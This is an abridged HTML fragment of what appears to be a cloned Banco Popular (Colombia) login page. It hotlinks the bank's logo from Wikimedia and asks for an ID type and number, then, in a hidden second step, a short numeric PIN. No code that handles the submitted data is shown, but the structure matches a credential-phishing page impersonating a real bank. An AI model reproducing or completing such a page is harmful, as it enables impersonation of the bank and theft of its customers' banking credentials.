...
<html lang="en">
  ...
  <body style="background-color:#f5f5f5;">
    ...
    <br><div id="texto1">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Banco_Popular_%28Colombia%29_logo.svg" alt="" srcset="" width="80%">
      <br> <label>Tipo de documento</label>
      <center><select name="" id="">
        <option value="">Cédula De Ciudadanía</option>
      </select></center>
      <label for="">Número de documento</label>
      <center><input type="tel" name="" id="txtUsuario" minlength="6" maxlength="10">
    ...
    <div id="texto2" class="hidden">
      ...
      <center><input type="tel" name="" id="txtPass" minlength="4" maxlength="6">
